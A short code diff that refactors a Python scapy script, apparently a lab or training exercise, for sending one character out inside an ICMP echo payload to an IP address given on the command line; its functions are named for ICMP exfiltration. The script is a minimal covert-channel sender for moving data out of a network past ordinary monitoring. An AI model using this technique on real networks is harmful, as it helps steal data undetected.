@@ -1,12 +1,15 @@
 import sys
-from scapy.all import IP, ICMP, send
+from scapy.all import *
 
-def icmp_exf_send(ip_dst, letter):
-    packet = IP(dst=ip_dst) / ICMP() / letter.encode()
+def send_icmp_exfiltration(destination_ip, character):
+    ascii_value = ord(character)
+
+    packet = IP(dst=destination_ip)/ICMP()/Raw(load=str(ascii_value))
 
     send(packet)
 
 if __name__ == "__main__":
-    ip_dst = sys.argv[1]
-    letter = sys.argv[2]
-    icmp_exf_send(ip_dst, letter)
+    destination_ip = sys.argv[1]
+    character = sys.argv[2]
+
+    send_icmp_exfiltration(destination_ip, character)
